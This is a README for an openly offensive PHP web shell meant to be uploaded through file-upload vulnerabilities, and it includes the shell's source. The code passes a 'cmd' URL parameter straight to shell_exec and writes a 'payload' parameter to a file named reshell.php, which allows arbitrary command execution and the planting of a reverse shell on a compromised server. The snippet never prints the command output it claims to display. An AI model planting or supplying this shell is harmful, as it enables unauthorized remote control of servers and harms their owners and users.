# extra-web-shell

## what is this?
#### this is a simple web shell, contains both, bind and option of upload a reverse shell

## how can this help me?
#### well, sometimes when you find a file upload vulnerability, you will find that you can't bypass the extension eaisy, for example you have to try many extesions methods such as, php, php5, jpg.php ... this extra web shell, will help you to upload any kind of files start from php, txt ...etc

## bind shell section
#### this part of the tool, you can execute any command on the server without any problem, and the output will be visible in the output border

## creat file or reverse shell section
#### here you can upload any file just copy the content of this file and the output will gives you the link of it to acssess
#### you can edit the name and the extension in the source code from "reshell.php" to what you like
```
<?php
	if(isset($_GET['cmd']))
	{
	    $output = shell_exec($_GET['cmd']);
	}
	elseif (isset($_GET['payload'])) {
		file_put_contents("reshell.php", $_GET['payload']);
		$path = "reshell.php";
	}
?>
<html>
<body>
<div class="main">
	<h1>reverse shell</h1>
	<form action="<?php echo $_SERVER['PHP_SELF']?>">
		<textarea type="text" name="payload">your payload here ...</textarea>
		<input type="submit" name="submit" value="upload">
	</form>
</div>

</body>
</html>
```

## LICENCE
[MIT](https://github.com/hamza07-w/extra-web-shell/blob/main/LICENSE)
